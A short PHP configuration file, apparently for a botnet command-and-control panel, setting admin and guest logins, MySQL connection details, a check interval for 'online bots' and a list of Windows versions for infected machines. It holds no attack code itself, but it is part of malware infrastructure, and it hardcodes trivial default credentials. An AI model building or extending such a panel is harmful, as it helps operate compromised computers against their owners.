<?php

$config["admin"] = "admin";				//admin login name
$config["pass"] = "admin";				//admin password
	
$config["guest"] = "guest";				//admin login name
$config["gpass"] = "guest";				//admin password

$config["dbhost"] = "localhost";
$config["dbname"] = "dl";				//mysql database name
$config["dbuser"] = "dl";				//mysql database username
$config["dbpass"] = "dl";			//mysql databse password

$config["interval"] = 600;				//interval for check online bots

$OS = array
(
	0 => "Windows XP",
	1 => "Windows 2003",
	2 => "Windows Vista",
	3 => "Windows 7",
	4 => "Other"
);

?>